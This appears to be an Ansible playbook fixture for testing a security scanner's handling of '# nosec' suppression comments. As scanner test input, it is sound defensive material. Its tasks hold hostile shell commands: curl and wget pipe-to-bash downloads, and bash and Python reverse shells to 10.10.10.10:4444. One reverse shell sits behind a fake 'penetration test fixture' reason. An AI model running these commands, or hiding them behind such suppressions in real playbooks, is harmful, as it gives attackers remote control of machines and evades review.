# -- Suppression hardening examples -------------------------------------
# These exercise every branch of the hardened # nosec / # noqa handling:
#   1. Valid suppression (explicit rule + reason) - should silence a rule
#      with a full audit trail on `suppressed_by`.
#   2. Invalid suppression (no reason) - directive is reported as a
#      warning and the underlying finding still fires.
#   3. Invalid suppression (no rule list) - same treatment.
#   4. Malicious suppression - high-risk content plus a bogus reason
#      triggers the `suspicious_suppression` HIGH meta-finding.
#   5. Unsuppressable rule - a directive targeting e.g. `reverse_shell`
#      is rejected; the finding still fires AND we emit a warning.
- hosts: suppression_examples
  tasks:
    - name: valid suppression - internal bootstrap script, VPN-only
      ansible.builtin.shell: "curl http://internal-seed/init.sh | bash"  # nosec: curl_pipe_to_shell reason="internal VPN-only seed host, reviewed by SRE"

    - name: invalid suppression - missing reason (directive is ignored)
      ansible.builtin.shell: "wget http://example.com/install.sh | bash"  # nosec: wget_pipe_to_shell

    - name: invalid suppression - missing rule list (directive is ignored)
      ansible.builtin.shell: "curl http://another.example.com/x.sh | bash"  # nosec reason="no rule list"

    - name: malicious suppression - reverse-shell content behind a fake reason
      ansible.builtin.shell: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"  # nosec: reverse_shell reason="penetration test fixture"

    - name: suppression targets an unsuppressable rule (rejected)
      ansible.builtin.shell: "python3 -c 'import socket,os,pty; s=socket.socket(); s.connect((\"10.10.10.10\",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn(\"/bin/sh\")'"  # nosec: reverse_shell_python reason="nope"

